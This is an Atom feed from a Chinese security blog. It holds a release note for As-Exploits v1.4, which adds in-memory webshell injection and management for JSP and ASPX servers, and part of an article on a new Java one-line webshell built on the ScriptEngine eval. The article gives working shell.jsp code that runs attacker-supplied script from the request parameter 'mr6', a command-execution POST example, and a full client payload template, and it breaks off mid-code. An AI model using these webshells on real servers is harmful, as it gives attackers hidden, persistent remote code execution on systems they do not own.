<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>yzddMr6&#39;s Blog</title>
  
  <subtitle>脚本小子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yzddmr6.tk/"/>
  <updated>2021-07-25T12:24:49.545Z</updated>
  <id>https://yzddmr6.tk/</id>
  
  <author>
    <name>yzddMr6</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>As-Exploits v1.4更新</title>
    <link href="https://yzddmr6.tk/posts/As-Exploits-v1-4%E6%9B%B4%E6%96%B0/"/>
    <id>https://yzddmr6.tk/posts/As-Exploits-v1-4更新/</id>
    <published>2021-07-25T12:18:00.000Z</published>
    <updated>2021-07-25T12:24:49.545Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="更新日志">更新日志</h2><h3 id="v-1-4-2021-7-24">v 1.4 (2021/7/24)</h3><ul><li>aspx新增 内存马 模块</li><li>aspx新增 内存马管理 模块</li><li>jsp新增filter内存马</li><li>jsp内存马管理模块增强，支持filter、servlet（thx: tomcat-memshell-killer项目）</li><li>新增 执行自定义payload 模块</li><li>解决html渲染中文乱码</li></ul><h2 id="JSP内存马模块增强">JSP内存马模块增强</h2><h3 id="filter内存马">filter内存马</h3><p>新增filter类型内存马。内存马会把自己放到filter的第一位，在遇到shiro框架的时候就不用填写登录Cookie了。</p><p>默认支持Tomcat以及Spring。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179455921-aad8b171-a960-4357-9bcf-5414194563fe.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179563752-a8fd988f-f0c1-43d7-8514-68dfde76f258.png" alt="image.png"></p><h3 id="内存马管理">内存马管理</h3><p>内存马管理模块核心payload移植了tomcat-memshell-killer的代码，是不是看起来更直观了？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179476764-f2de8d7d-1020-4591-8af3-a8f4dfe274bd.png" alt="image.png"></p><p>还可以贴心的判断有没有其他人的内存马</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179587623-8194fe8f-87c4-407c-8fc9-3c57931b7984.png" alt="image.png"></p><p>卸载内存马填入Filter name即可</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179611709-bd09ea44-37a7-4f5e-a03f-974748411024.png" alt="image.png"></p><h2 id="ASPX内存马">ASPX内存马</h2><h3 id="内存马注入">内存马注入</h3><p>aspx内存马的核心代码来源于ysoserial.net的<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs" target="_blank" rel="noopener">GhostWebShell</a>，三好学生的博客中也有提到：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell" target="_blank" rel="noopener">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell</a></p><p>主要原理是利用了asp.net下虚拟文件的特性</p><blockquote><p>通过ASP.NET的VirtualPathProvider类能够创建虚拟文件，实现以下效果：虚拟文件不存在于服务器的文件系统，但是能够对其动态编译并提供访问服务。<a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">ysoserial.net</a>的<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs" target="_blank" rel="noopener">GhostWebShell.cs</a>提供了一种可供学习的利用思路。</p></blockquote><p>可以直接定义要注入的shell内容，默认为普通一句话，当然也可以改成冰蝎哥斯拉之类的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179765626-66136998-2575-4ef2-beaa-6bcc28c9565e.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179862888-b1609644-61dc-4ea8-af77-148d0a35abc7.png" alt="image.png"></p><p>连接的时候可以把注入的路径后面加点随机字符串，当作一个文件</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180001637-136d2dfa-57f3-4275-95a1-c6eaba905fc4.png" alt="image.png"></p><p>也可以把注入的路径当作一个目录，在目录下面填写随机文件名</p><p>要注意的是必须要用.aspx结尾，因为映射的是一个文件，所以要用指定的后缀才能解析。</p><p>暂时不支持通配符模式</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180015916-f50040c7-66d2-4b87-a2ff-cc20066a76bd.png" alt="image.png"></p><h3 id="内存马管理-2">内存马管理</h3><p>内存马注入的payload大部分是抄的</p><p>内存马管理部分的payload主要是自己手搓的。研究一下发现VirtualPathProvider主要用到了类似单向链表的结构，不像Tomcat的内存马有一个Config去定义。获取所有组件需要遍历链表，卸载的时候需要修改当前指针指向来删除节点，梦回数据结构课堂。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179923401-b13951bc-928e-43ed-bd34-7f211778aff0.png" alt="image.png"></p><p>卸载指定VPP</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180069879-05fa3f9e-111c-4142-8c23-5bc57c998500.png" alt="image.png"></p><p>再次获取组件发现内存马已经被删除。</p><p>剩下的这个System.Web.Hosting.MapPathBasedVirtualPathProvider是IIS默认组件，删除之后网站会崩，请慎重操作。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180083261-4da646b8-d1ca-4e37-b439-1edf2c0be139.png" alt="image.png"></p><h2 id="自定义脚本执行">自定义脚本执行</h2><p>这个功能主要是为了方便调试</p><p>在JSP下需要填写base64格式的编译后的class文件</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179626094-bc9f8c33-7153-4efa-84ce-751d37c7a648.png" alt="image.png"></p><p>格式按照https://github.com/AntSwordProject/AntSword-JSP-Template项目去编写即可，这里以baseinfo为例：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627179674263-ab17ae98-4519-473d-b60c-3c80d20c6322.png" alt="image.png"></p><h3 id="aspx">aspx</h3><p>aspx下就直接写jscript代码即可</p><p>如果想要调用C#的payload看我博客这篇文章：<a href="https://yzddmr6.tk/posts/jscript-load-csharp-assembly/">https://yzddmr6.tk/posts/jscript-load-csharp-assembly/</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627180137926-d97947ee-6d65-44e1-b2b5-62785fc43191.png" alt="image.png"></p><h3 id="php">php</h3><p>直接写php代码</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1627183521659-3654ae47-bfbb-4241-be8c-cfc4c8d1b520.png" alt="image.png"></p><h2 id="项目地址">项目地址</h2><p><a href="https://github.com/yzddmr6/As-Exploits" target="_blank" rel="noopener">https://github.com/yzddmr6/As-Exploits</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;更新日志&quot;&gt;更新日志&lt;/h2&gt;&lt;h3 id=&quot;v-1-4-2021-7-24&quot;&gt;v 1.4 (2021/7/24)&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;aspx新增 内存马 模块&lt;/li&gt;
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>一种新型Java一句话木马的实现</title>
    <link href="https://yzddmr6.tk/posts/%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>https://yzddmr6.tk/posts/一种新型Java一句话木马的实现/</id>
    <published>2021-06-19T05:05:00.000Z</published>
    <updated>2021-06-19T05:10:56.857Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><blockquote><p>本文首发于先知社区</p></blockquote><h2 id="前言">前言</h2><p>一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，可以几乎实现Java上的所有功能。不足之处就是Payload过于巨大，并且不像脚本语言一样方便修改。并且还存在很多特征，例如继承ClassLoader，反射调用defineClass等。本人在这里提出一种新型Java一句话木马：利用Java中JS引擎实现的一句话木马。</p><h2 id="基本原理">基本原理</h2><ol><li>Java没有eval函数，Js有eval函数，可以把字符串当代码解析。</li><li>Java从1.6开始自带ScriptEngineManager这个类，原生支持调用js，无需安装第三方库。</li><li>ScriptEngine支持在Js中调用Java的对象。</li></ol><p>综上所述，我们可以利用Java调用JS引擎的eval，然后在Payload中反过来调用Java对象，这就是本文提出的新型Java一句话的核心原理。</p><p>ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始自带。其中Java 6/7采用的js解析引擎是Rhino，而从java8开始换成了Nashorn。不同解析引擎对同样的代码有一些差别，这点后面有所体现。</p><p>如果说原理其实一两句话就可以说清楚，但是难点在于Payload的编写。跨语言调用最大的一个难点就是数据类型以及方法的转换。例如Java中有byte数组，Js中没有怎么办？C++里有指针但是Java里没有这个玩意怎么办？</p><p>在实现期间踩了很多的坑，这篇文章跟大家一起掰扯掰扯，希望能给大家提供点帮助。</p><h3 id="获取脚本引擎">获取脚本引擎</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//通过脚本名称获取：</span><br><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;JavaScript&quot;);  //简写为js也可以</span><br><span class="line">//通过文件扩展名获取： </span><br><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;);  </span><br><span class="line">//通过MIME类型来获取： </span><br><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(&quot;text/javascript&quot;);</span><br></pre></td></tr></table></figure><h3 id="绑定对象">绑定对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">engine.put(&quot;request&quot;, request);</span><br><span class="line">engine.put(&quot;response&quot;, response);</span><br><span class="line">engine.eval(request.getParameter(&quot;mr6&quot;));</span><br></pre></td></tr></table></figure><p>或者通过eval的重载函数，直接把对象通过一个HashMap放进去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(request.getParameter(&quot;ant&quot;), new javax.script.SimpleBindings(new java.util.HashMap() &#123;&#123;</span><br><span class="line">put(&quot;response&quot;, response);</span><br><span class="line">put(&quot;request&quot;, request);</span><br><span class="line">&#125;&#125;))</span><br></pre></td></tr></table></figure><h3 id="eval">eval</h3><p>综合上面两步，有很多种写法，例如：</p><p>shell.jsp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">     javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">     engine.put(&quot;request&quot;, request);</span><br><span class="line">     engine.put(&quot;response&quot;, response);</span><br><span class="line">     engine.eval(request.getParameter(&quot;mr6&quot;));</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>或者直接缩写成一句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">     new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(request.getParameter(&quot;mr6&quot;), new javax.script.SimpleBindings(new java.util.HashMap() &#123;&#123;</span><br><span class="line">            put(&quot;response&quot;, response);</span><br><span class="line">            put(&quot;request&quot;, request);</span><br><span class="line">        &#125;&#125;));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>以执行命令为例：</p><p>POST：mr6=java.lang.Runtime.getRuntime().exec(“calc”);</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png" alt="image.png"></p><p>即可达到命令执行的效果。</p><h2 id="基本语法">基本语法</h2><p>翻阅文档比较枯燥，这里挑一些用到的说一说。</p><p>感兴趣的同学也可以看一下原文档：<a href="https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf</a></p><h3 id="调用Java方法">调用Java方法</h3><p>前面加上全限定类名即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var s = [3];</span><br><span class="line">s[0] = &quot;cmd&quot;;</span><br><span class="line">s[1] = &quot;/c&quot;;</span><br><span class="line">s[2] = &quot;whoami&quot;;//yzddmr6</span><br><span class="line">var p = java.lang.Runtime.getRuntime().exec(s);</span><br><span class="line">var sc = new java.util.Scanner(p.getInputStream(),&quot;GBK&quot;).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">var result = sc.hasNext() ? sc.next() : &quot;&quot;;</span><br><span class="line">sc.close();</span><br></pre></td></tr></table></figure><h3 id="导入Java类型">导入Java类型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var Vector = java.util.Vector;</span><br><span class="line">var JFrame = Packages.javax.swing.JFrame;</span><br><span class="line"> </span><br><span class="line"> //这种写法仅仅支持Nashorn，Rhino并不支持</span><br><span class="line">var Vector = Java.type(&quot;java.util.Vector&quot;)</span><br><span class="line">var JFrame = Java.type(&quot;javax.swing.JFrame&quot;)</span><br></pre></td></tr></table></figure><h3 id="创建Java类型的数组">创建Java类型的数组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// Rhino</span><br><span class="line">var Array = java.lang.reflect.Array</span><br><span class="line">var intClass = java.lang.Integer.TYPE</span><br><span class="line">var array = Array.newInstance(intClass, 8)</span><br><span class="line"></span><br><span class="line">// Nashorn</span><br><span class="line">var IntArray = Java.type(&quot;int[]&quot;)</span><br><span class="line">var array = new IntArray(8)</span><br></pre></td></tr></table></figure><h3 id="导入Java类">导入Java类</h3><p>默认情况下，Nashorn 不会导入Java的包。这样主要为了避免类型冲突，比如你写了一个new String，引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调用都需要加上全限定类名。但是这样写起来很不方便。</p><p>这个时候大聪明Mozilla Rhino 就想了一个办法，整了个扩展文件，里面提供了importClass 跟importPackage 方法，可以导入指定的Java包。</p><ul><li>importClass 导入指定Java的类，现在推荐用Java.type</li><li>importPackage 导入一个Java包，类似import com.yzddmr6.*，现在推荐用JavaImporter</li></ul><p>这里需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，而当其不存在时，则把它当成package名称，而并不会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load(&quot;nashorn:mozilla_compat.js&quot;);</span><br><span class="line"></span><br><span class="line">importClass(java.util.HashSet);</span><br><span class="line">var set = new HashSet();</span><br><span class="line"></span><br><span class="line">importPackage(java.util);</span><br><span class="line">var list = new ArrayList();</span><br></pre></td></tr></table></figure><p>在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// create JavaImporter with specific packages and classes to import</span><br><span class="line"></span><br><span class="line">var SwingGui = new JavaImporter(javax.swing,</span><br><span class="line">                            javax.swing.event,</span><br><span class="line">                            javax.swing.border,</span><br><span class="line">                            java.awt.event);</span><br><span class="line">with (SwingGui) &#123;</span><br><span class="line">    // 在with里面才可以调用swing里面的类，防止污染</span><br><span class="line">    var mybutton = new JButton(&quot;test&quot;);</span><br><span class="line">    var myframe = new JFrame(&quot;test&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法调用与重载">方法调用与重载</h3><p>方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var System = Java.type(&apos;java.lang.System&apos;);</span><br><span class="line">System.out.println(&apos;Hello, World&apos;);    // Hello, World</span><br><span class="line">System.out[&apos;println&apos;](&apos;Hello, World&apos;); // Hello, World</span><br></pre></td></tr></table></figure><p>Java支持重载（Overload）方法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var System = Java.type(&apos;java.lang.System&apos;);</span><br><span class="line">System.out[&apos;println&apos;](3.14);          // 3.14</span><br><span class="line">System.out[&apos;println(double)&apos;](3.14);  // 3.14</span><br><span class="line">System.out[&apos;println(int)&apos;](3.14);     // 3</span><br></pre></td></tr></table></figure><h2 id="Payload结构设计">Payload结构设计</h2><p>详情写在注释里了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">//导入基础拓展</span><br><span class="line">try &#123;</span><br><span class="line">  load(&quot;nashorn:mozilla_compat.js&quot;);</span><br><span class="line">&#125; catch (e) &#123;&#125;</span><br><span class="line">//导入常见包</span><br><span class="line">importPackage(Packages.java.util);</span><br><span class="line">importPackage(Packages.java.lang);</span><br><span class="line">importPackage(Packages.java.io);</span><br><span class="line"></span><br><span class="line">var output = new StringBuffer(&quot;&quot;); //输出</span><br><span class="line">var cs = &quot;$&#123;jspencode&#125;&quot;; //设置字符集编码</span><br><span class="line">var tag_s = &quot;$&#123;tag_s&#125;&quot;; //开始符号</span><br><span class="line">var tag_e = &quot;$&#123;tag_e&#125;&quot;; //结束符号</span><br><span class="line">try &#123;</span><br><span class="line">  response.setContentType(&quot;text/html&quot;);</span><br><span class="line">  request.setCharacterEncoding(cs);</span><br><span class="line">  response.setCharacterEncoding(cs);</span><br><span class="line">  function decode(str) &#123;</span><br><span class="line">    //参数解码</span><br><span class="line">    str = str.substr(2);</span><br><span class="line">    var bt = Base64DecodeToByte(str);</span><br><span class="line">    return new java.lang.String(bt, cs);</span><br><span class="line">  &#125;</span><br><span class="line">  function Base64DecodeToByte(str) &#123;</span><br><span class="line">    importPackage(Packages.sun.misc);</span><br><span class="line">    importPackage(Packages.java.util);</span><br><span class="line">    var bt;</span><br><span class="line">    try &#123;</span><br><span class="line">      bt = new BASE64Decoder().decodeBuffer(str);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      bt = Base64.getDecoder().decode(str);</span><br><span class="line">    &#125;</span><br><span class="line">    return bt;</span><br><span class="line">  &#125;</span><br><span class="line">  function asoutput(str) &#123;</span><br><span class="line">    //回显加密</span><br><span class="line">    return str;</span><br><span class="line">  &#125;</span><br><span class="line">  function func(z1) &#123;</span><br><span class="line">    //eval function</span><br><span class="line"></span><br><span class="line">    return z1;</span><br><span class="line">  &#125;</span><br><span class="line">  output.append(func(z1)); //添加功能函数回显</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">  output.append(&quot;ERROR:// &quot; + e.toString()); //输出错误</span><br><span class="line">&#125;</span><br><span class="line">try &#123;</span><br><span class="line">  response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //回显</span><br><span class="line">&#125; catch (e) &#123;&#125;</span><br></pre></td></tr></table></figure><h2 id="语法问题的坑">语法问题的坑</h2><h3 id="两种语言对象间的相互转换">两种语言对象间的相互转换</h3><p>要注意的是，在遇到Java跟JS可能存在类型冲突的地方，即使导入了包也要加上全限定类名。</p><p>在编写payload的时候被坑了很久的一个问题就是，在导入java.lang以后写new String(bt,cs)没有加全限定类名，导致打印出来的一直是一个字符串地址。</p><p>正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new出来的会是Js的对象。</p><p>下面附上类型对比表：</p><table><thead><tr><th>JavaScript Value</th><th>JavaScript Type</th><th>Java Type</th><th>Is Scriptable</th><th>Is Function</th></tr></thead><tbody><tr><td>{a:1, b:[‘x’,‘y’]}</td><td>object</td><td>org.mozilla.javascript.NativeObject</td><td><strong>+</strong></td><td>-</td></tr><tr><td>[1,2,3]</td><td>object</td><td>org.mozilla.javascript.NativeArray</td><td><strong>+</strong></td><td>-</td></tr><tr><td>1</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>1.2345</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>NaN</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>Infinity</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>-Infinity</td><td>number</td><td>java.lang.Double</td><td>-</td><td>-</td></tr><tr><td>true</td><td>boolean</td><td>java.lang.Boolean</td><td>-</td><td>-</td></tr><tr><td>“test”</td><td>string</td><td>java.lang.String</td><td>-</td><td>-</td></tr><tr><td>null</td><td>object</td><td>null</td><td>-</td><td>-</td></tr><tr><td>undefined</td><td>undefined</td><td>org.mozilla.javascript.Undefined</td><td>-</td><td>-</td></tr><tr><td>function () { }</td><td>function</td><td>org.mozilla.javascript.gen.c1</td><td><strong>+</strong></td><td><strong>+</strong></td></tr><tr><td>/.*/</td><td>object</td><td>org.mozilla.javascript.regexp.NativeRegExp</td><td><strong>+</strong></td><td><strong>+</strong></td></tr></tbody></table><h3 id="Rhino-Nashorn解析的差异">Rhino/Nashorn解析的差异</h3><p>这也是当时一个坑点，看下面一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var readonlyenv = System.getenv();</span><br><span class="line">var cmdenv = new java.util.HashMap(readonlyenv);</span><br><span class="line">var envs = envstr.split(&quot;\\|\\|\\|asline\\|\\|\\|&quot;);</span><br><span class="line">for (var i = 0; i &lt; envs.length; i++) &#123;</span><br><span class="line">  var es = envs[i].split(&quot;\\|\\|\\|askey\\|\\|\\|&quot;);</span><br><span class="line">  if (es.length == 2) &#123;</span><br><span class="line">    cmdenv.put(es[0], es[1]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var e = [];</span><br><span class="line">var i = 0;</span><br><span class="line">print(cmdenv+&apos;\n&apos;);</span><br><span class="line">for (var key in cmdenv) &#123;//关键</span><br><span class="line">  print(&quot;key: &quot;+key+&quot;\n&quot;);</span><br><span class="line">  e[i] = key + &quot;=&quot; + cmdenv[key];</span><br><span class="line">  i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中cmdenv是个HashMap，这段代码在Java 8中Nashorn引擎可以正常解析，var key in cmdenv的时候把cmdenv的键给输出了</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074110621-4ecd43d6-0013-4f1a-83a3-4a0075ba6930.png" alt="image.png"></p><p>但是在Java 6下运行时，Rhino把他当成了一个js对象，把其属性输出了</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623074128796-2e85593d-37b7-4822-82fb-5ebbebb79edd.png" alt="image.png"></p><p>所以涉及到这种混合写法就会有异议，不同的引擎有不同的解释。</p><p>解决办法使用Java迭代器即可，不掺杂js的写法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var i = 0;</span><br><span class="line">var iter = cmdenv.keySet().iterator();</span><br><span class="line">while (iter.hasNext()) &#123;</span><br><span class="line">  var key = iter.next();</span><br><span class="line">  var val = cmdenv.get(key);</span><br><span class="line">  //print(&quot;\nkey:&quot; + key);</span><br><span class="line">  //print(&quot;\nval:&quot; + val);</span><br><span class="line">  e[i] = key + &quot;=&quot; + val;</span><br><span class="line">  i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反射的坑">反射的坑</h3><p>在Java中，如果涉及到不同版本之间类的包名不一样，我们通常不能直接导入，而要使用反射的写法。</p><p>例如base64解码的时候，Java的写法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public byte[] Base64DecodeToByte(String str) &#123;</span><br><span class="line">    byte[] bt = null;</span><br><span class="line">    String version = System.getProperty(&quot;java.version&quot;);</span><br><span class="line">    try &#123;</span><br><span class="line">        if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            bt = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            bt = (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125;</span><br><span class="line">        return bt;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return new byte[]&#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改写成js风格后，发现会有一些奇奇怪怪的BUG。（后来发现反射其实也可以实现，导入Java类型然后再传入反射参数即可，就是比较麻烦）</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623112217854-f668143f-792b-4b56-9bd2-9414a210cbbf.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 